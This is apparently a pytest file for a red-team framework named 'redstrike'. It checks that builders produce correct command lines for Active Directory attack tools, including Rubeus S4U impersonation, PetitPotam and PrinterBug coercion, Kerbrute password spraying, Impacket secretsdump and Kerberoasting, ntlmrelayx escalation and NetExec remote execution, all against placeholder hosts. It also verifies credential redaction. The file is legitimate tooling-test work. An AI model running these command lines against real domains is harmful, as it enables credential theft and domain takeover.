from __future__ import annotations

from pydantic import SecretStr

from redstrike.ad.netexec import NetExecCommandBuilder
from redstrike.builders import (
    AdcsModernBuilder,
    CoerceBuilder,
    ImpacketBuilder,
    KerbruteBuilder,
    RubeusBuilder,
    SharpHoundBuilder,
)
from redstrike.core.manifest import ToolSpec, _parse_semver, audit_toolchain, probe_tool_version
from redstrike.core.runner import redact_argv
from redstrike.runtime.intents import IntentRegistry


def test_rubeus_s4u_builder() -> None:
    builder = RubeusBuilder()
    argv = builder.s4u(
        user="attacker_pc$",
        impersonateuser="Administrator",
        msdsspn="cifs/target.corp.local",
        domain="corp.local",
        rc4=SecretStr("31d6cfe0d16ae931b73c59d7e0c089c0"),
        ptt=True,
    )
    assert argv[:2] == ["Rubeus.exe", "s4u"]
    assert "/user:attacker_pc$" in argv
    assert "/impersonateuser:Administrator" in argv
    assert "/msdsspn:cifs/target.corp.local" in argv
    assert "/ptt" in argv
    assert any(a.startswith("/rc4:") for a in argv)

    red = redact_argv(argv)
    assert any("/rc4:***REDACTED***" in a for a in red)


def test_coerce_builder() -> None:
    coerce = CoerceBuilder()

    spool = coerce.spoolsample(
        target="dc01.corp.local",
        listener="10.10.10.5",
        username="hunter",
        password=SecretStr("Pass123"),
        domain="corp.local",
    )
    assert spool[0] == "printerbug.py"
    assert "corp.local/hunter:Pass123@dc01.corp.local" in spool
    assert spool[-1] == "10.10.10.5"

    spool_win = coerce.spoolsample(
        target="dc01.corp.local",
        listener="10.10.10.5",
        binary="C:\\Tools\\SpoolSample.exe",
    )
    assert spool_win == ["C:\\Tools\\SpoolSample.exe", "dc01.corp.local", "10.10.10.5"]

    petit = coerce.petitpotam(
        target="dc01.corp.local",
        listener="10.10.10.5",
        username="hunter",
        password=SecretStr("Pass123"),
        domain="corp.local",
    )
    assert petit[:3] == ["petitpotam.py", "-u", "hunter"]
    assert "10.10.10.5" in petit and "dc01.corp.local" in petit

    dfir = coerce.dfircoerce(
        target="dc01.corp.local",
        listener="10.10.10.5",
        username="hunter",
        domain="corp.local",
        method="FSRVP",
    )
    assert dfir[0] == "dfircoerce.py"
    assert "-m" in dfir and "FSRVP" in dfir


def test_netexec_exec_and_enum_extensions() -> None:
    nxc = NetExecCommandBuilder()

    smb_x = nxc.smb_exec("whoami /all", target="10.10.10.20", username="admin", password=SecretStr("P@ss"), exec_method="smbexec")
    assert smb_x[:3] == ["nxc", "smb", "10.10.10.20"]
    assert "-X" in smb_x and "whoami /all" in smb_x
    assert "--exec-method" in smb_x and "smbexec" in smb_x

    winrm_x = nxc.winrm_exec("Get-Process", target="10.10.10.20", username="admin")
    assert winrm_x[:3] == ["nxc", "winrm", "10.10.10.20"]
    assert "-X" in winrm_x and "Get-Process" in winrm_x

    rid = nxc.rid_brute(max_rid=5000, target="10.10.10.20", username="guest", password=SecretStr(""))
    assert "--rid-brute" in rid and "5000" in rid

    laps = nxc.laps(target="10.10.10.20", username="hunter", password=SecretStr("P@ss"))
    assert laps[:3] == ["nxc", "smb", "10.10.10.20"]
    assert "--laps" in laps

    gpp = nxc.gpp_password(target="dc01.corp.local", username="hunter", password=SecretStr("P@ss"))
    assert gpp[-2:] == ["-M", "gpp_password"]


def test_kerbrute_builder() -> None:
    kerb = KerbruteBuilder()

    enum_argv = kerb.userenum(userlist="users.txt", domain="corp.local", dc="10.10.10.1")
    assert enum_argv == ["kerbrute", "userenum", "-d", "corp.local", "--dc", "10.10.10.1", "users.txt"]

    spray_argv = kerb.passwordspray(
        userlist="users.txt",
        password=SecretStr("Winter2026!"),
        domain="corp.local",
        delay_ms=200,
    )
    assert spray_argv[:4] == ["kerbrute", "passwordspray", "-d", "corp.local"]
    assert "--delay" in spray_argv and "200" in spray_argv
    assert "users.txt" in spray_argv

    red = redact_argv(spray_argv)
    assert red[-1] == "***REDACTED***"


def test_impacket_suite_builder() -> None:
    imp = ImpacketBuilder()

    sec_argv = imp.secretsdump(
        target="10.10.10.1",
        username="Administrator",
        password=SecretStr("DomainAdminPass!"),
        domain="corp.local",
        just_dc_ntlm=True,
    )
    assert sec_argv[0] == "secretsdump.py"
    assert "corp.local/Administrator:DomainAdminPass!@10.10.10.1" in sec_argv
    assert "-just-dc-ntlm" in sec_argv

    red_sec = redact_argv(sec_argv)
    assert not any("DomainAdminPass!" in a for a in red_sec)
    assert any("***REDACTED***" in a for a in red_sec)

    spn_argv = imp.getuserspns(username="hunter", password=SecretStr("P@ss"), domain="corp.local", request=True)
    assert spn_argv[0] == "GetUserSPNs.py"
    assert "corp.local/hunter:P@ss" in spn_argv
    assert "-request" in spn_argv

    relay_argv = imp.ntlmrelayx(target="ldaps://dc01.corp.local", delegate_access=True, escalate_user="attacker$")
    assert relay_argv[:3] == ["ntlmrelayx.py", "-t", "ldaps://dc01.corp.local"]
    assert "--delegate-access" in relay_argv
    assert "--escalate-user" in relay_argv and "attacker$" in relay_argv


def test_sharphound_and_adcs_modern() -> None:
    sh = SharpHoundBuilder()
    sh_argv = sh.sharphound(collection_methods="All,DCOnly", domain="corp.local", zip_filename="bh.zip")
    assert sh_argv[:3] == ["SharpHound.exe", "-c", "All,DCOnly"]
    assert "--domain" in sh_argv and "corp.local" in sh_argv
    assert "--zipfilename" in sh_argv and "bh.zip" in sh_argv

    adcs = AdcsModernBuilder()
    esc17_argv = adcs.pyesc17(args=("-ca", "corp-CA", "-u", "child.local/hunter:P@ss"))
    assert esc17_argv == ["pyesc17.py", "-ca", "corp-CA", "-u", "child.local/hunter:P@ss"]

    esc17_red = redact_argv(esc17_argv)
    assert not any("P@ss" in a for a in esc17_red)
    assert any("***REDACTED***" in a for a in esc17_red)


def test_manifest_version_parsing_and_audit() -> None:
    assert _parse_semver("1.3.0") == (1, 3, 0)
    assert _parse_semver("v5.1.0-alpha") == (5, 1, 0)
    assert _parse_semver("2.2") == (2, 2)

    fake_spec = ToolSpec(
        name="faketool",
        aliases=("nonexistent_binary_xyz",),
        category="Test",
        purpose="Testing",
        min_version="1.0.0",
    )
    status = probe_tool_version(fake_spec)
    assert status.found is False
    assert status.status == "missing"

    all_statuses = audit_toolchain()
    assert len(all_statuses) >= 8
    names = {s.name for s in all_statuses}
    assert "netexec" in names
    assert "certipy" in names
    assert "rubeus" in names
    assert "kerbrute" in names


def test_intent_registry_includes_all_modern_intents() -> None:
    reg = IntentRegistry()
    known = reg.known()
    assert "rubeus.s4u" in known
    assert "coerce.spoolsample" in known
    assert "coerce.petitpotam" in known
    assert "kerbrute.spray" in known
    assert "impacket.secretsdump" in known
    assert "impacket.ntlmrelayx" in known
    assert "netexec.smb_exec" in known
    assert "adcs.pyesc17" in known
    assert "sharphound.collect" in known
